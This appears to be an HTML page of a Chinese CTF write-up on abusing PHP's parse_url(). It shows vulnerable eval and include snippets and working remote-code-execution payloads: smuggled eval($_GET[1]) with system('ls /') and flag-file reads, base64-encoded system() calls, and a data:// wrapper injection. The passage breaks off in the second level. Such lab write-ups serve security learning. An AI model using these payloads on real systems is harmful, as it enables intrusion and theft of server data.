@@ -1,0 +1,1495 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='每周大挑战——PARSE_URL parse_url()函数 此函数返回一个关联数组，包含现有 URL 的各种组成部分。
+如果缺少了其中的某一个，则不会为这个组成部分创建数组项。
+对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 parse_url — 解析 URL，返回其组成部分 print_r(parse_url(&amp;#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc&amp;#39;)); 输出为: Array ( [scheme] =&amp;gt; http [host] =&amp;gt; 127.0.0.1 [port] =&amp;gt; 8080 [user] =&amp;gt; username [pass] =&amp;gt; password [path] =&amp;gt; /index.php [query] =&amp;gt; id=1 [fragment] =&amp;gt; abc ) 第一关 1 2 3 $data = parse_url($_GET[&amp;#39;u&amp;#39;]); eval($data[&amp;#39;host&amp;#39;]); 题目分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &amp;lt;?'>
+<title>PARSE_URL</title>
+
+<link rel='canonical' href='https://relish1one.github.io/p/parse_url/'>
+
+<link rel="stylesheet" href="/scss/style.min.b520104728805017af298ac0ca9dc201454dbb7fb91074b04767eaca6465f278.css"><meta property='og:title' content='PARSE_URL'>
+<meta property='og:description' content='每周大挑战——PARSE_URL parse_url()函数 此函数返回一个关联数组，包含现有 URL 的各种组成部分。
+如果缺少了其中的某一个，则不会为这个组成部分创建数组项。
+对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 parse_url — 解析 URL，返回其组成部分 print_r(parse_url(&amp;#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc&amp;#39;)); 输出为: Array ( [scheme] =&amp;gt; http [host] =&amp;gt; 127.0.0.1 [port] =&amp;gt; 8080 [user] =&amp;gt; username [pass] =&amp;gt; password [path] =&amp;gt; /index.php [query] =&amp;gt; id=1 [fragment] =&amp;gt; abc ) 第一关 1 2 3 $data = parse_url($_GET[&amp;#39;u&amp;#39;]); eval($data[&amp;#39;host&amp;#39;]); 题目分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &amp;lt;?'>
+<meta property='og:url' content='https://relish1one.github.io/p/parse_url/'>
+<meta property='og:site_name' content='R1one&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-05-17T23:16:11&#43;08:00'/><meta property='article:modified_time' content='2023-05-17T23:16:11&#43;08:00'/>
+<meta name="twitter:title" content="PARSE_URL">
+<meta name="twitter:description" content="每周大挑战——PARSE_URL parse_url()函数 此函数返回一个关联数组，包含现有 URL 的各种组成部分。
+如果缺少了其中的某一个，则不会为这个组成部分创建数组项。
+对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 parse_url — 解析 URL，返回其组成部分 print_r(parse_url(&amp;#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc&amp;#39;)); 输出为: Array ( [scheme] =&amp;gt; http [host] =&amp;gt; 127.0.0.1 [port] =&amp;gt; 8080 [user] =&amp;gt; username [pass] =&amp;gt; password [path] =&amp;gt; /index.php [query] =&amp;gt; id=1 [fragment] =&amp;gt; abc ) 第一关 1 2 3 $data = parse_url($_GET[&amp;#39;u&amp;#39;]); eval($data[&amp;#39;host&amp;#39;]); 题目分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &amp;lt;?">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/ava_hu23b1ce8b171806f482798fb1ab4dbf94_485038_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">R1one&#39;s Blog</a></h1>
+            <h2 class="site-description">保持热爱，享受孤独</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Relish1one'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://relish1one.github.io/" selected>English</option>
+                        
+                            <option value="https://relish1one.github.io/zh-cn/" >中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#parse_url函数">parse_url()函数</a></li>
+    <li><a href="#第一关">第一关</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#题目分析">题目分析</a></li>
+            <li><a href="#payload">payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#第二关">第二关</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#题目分析-1">题目分析</a></li>
+            <li><a href="#payload-1">payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#第三关">第三关</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#分析">分析</a></li>
+            <li><a href="#payload-2">payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#第四关">第四关</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#知识点">知识点</a></li>
+            <li><a href="#payload-3">payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#第五关">第五关</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#题目分析-2">题目分析</a></li>
+            <li><a href="#知识点-1">知识点</a></li>
+            <li><a href="#payload-4">payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#第六关">第六关</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#题目分析-3">题目分析</a></li>
+            <li><a href="#知识点-2">知识点</a></li>
+            <li><a href="#payload-5">payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctfshow/" >
+                ctfshow
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/parse_url/">PARSE_URL</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 17, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="每周大挑战parse_url">每周大挑战——PARSE_URL</h1>
+<h2 id="parse_url函数">parse_url()函数</h2>
+<p>此函数返回一个关联数组，包含现有 URL 的各种组成部分。</p>
+<p>如果缺少了其中的某一个，则不会为这个组成部分创建数组项。</p>
+<p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">parse_url — 解析 URL，返回其组成部分
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print_r(parse_url(&#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc&#39;));
+</span></span><span class="line"><span class="cl">输出为:
+</span></span><span class="line"><span class="cl">Array
+</span></span><span class="line"><span class="cl">(
+</span></span><span class="line"><span class="cl">    [scheme] =&gt; http
+</span></span><span class="line"><span class="cl">    [host] =&gt; 127.0.0.1
+</span></span><span class="line"><span class="cl">    [port] =&gt; 8080
+</span></span><span class="line"><span class="cl">    [user] =&gt; username
+</span></span><span class="line"><span class="cl">    [pass] =&gt; password
+</span></span><span class="line"><span class="cl">    [path] =&gt; /index.php
+</span></span><span class="line"><span class="cl">    [query] =&gt; id=1
+</span></span><span class="line"><span class="cl">    [fragment] =&gt; abc
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第一关">第一关</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="题目分析">题目分析</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="s2">&#34;http://system(&#39;ls /&#39;);&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;host: &#34;</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;path: &#34;</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">// 输出
+</span></span></span><span class="line"><span class="cl"><span class="err">host: system(&#39;ls 
+</span></span></span><span class="line"><span class="cl"><span class="err">path: /&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">因为parse函数把/后面的内容自动作为path的内容，所以需要将/替换掉，可以利用参数逃逸
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload">payload</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=http://eval($_GET[1]);&amp;1=system(&#34;ls /&#34;);
+</span></span><span class="line"><span class="cl">?u=http://eval($_GET[1]);&amp;1=system(&#34;tac /flag_is_here.txt&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?u=http://eval($_POST[1]);
+</span></span><span class="line"><span class="cl">POST: 1=system(&#34;ls /&#34;);
+</span></span><span class="line"><span class="cl">1=system(&#34;tac /flag_is_here.txt&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/?u=aa://eval(base64_decode(&#39;c3lzdGVtKCJscyAvIik7&#39;));/aaa
+</span></span><span class="line"><span class="cl">/?u=aa://eval(base64_decode(&#39;c3lzdGVtKCJjYXQgL2ZsYWdfaXNfaGVyZS50eHQiKTs=&#39;));/aaa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第二关">第二关</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="题目分析-1">题目分析</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">在</span> <span class="nx">data</span> <span class="nx">后面有两个冒号，因为最后一个冒号会被当做端口前的那个冒号，所以需要多打一个冒号才能让</span> <span class="nx">host</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">path</span> <span class="nx">在识别的时候会被带上前面的</span> <span class="o">/</span><span class="p">,</span> <span class="nx">所以只用再加一个就能构造了</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="s2">&#34;http://data:1//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; http
+</span></span></span><span class="line"><span class="cl"><span class="err">    [host] =&gt; data
+</span></span></span><span class="line"><span class="cl"><span class="err">    [port] =&gt; 1
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; //text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">data//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$data = parse_url(&#34;http://data:://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">print_r($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">echo $data[&#39;host&#39;].$data[&#39;path&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; http
+</span></span></span><span class="line"><span class="cl"><span class="err">    [host] =&gt; data:
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; //text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$data = parse_url(&#34;http:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">print_r($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">echo $data[&#39;host&#39;].$data[&#39;path&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; http
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">PHP Notice:  Undefined index: host in D:\CODE_python\1.php on line 7
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">Notice: Undefined index: host in D:\CODE_python\1.php on line 7
+</span></span></span><span class="line"><span class="cl"><span class="err">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload-1">payload</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=http://data:://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span><span class="line"><span class="cl">// &lt;?php phpinfo(); ?&gt;
+</span></span><span class="line"><span class="cl">
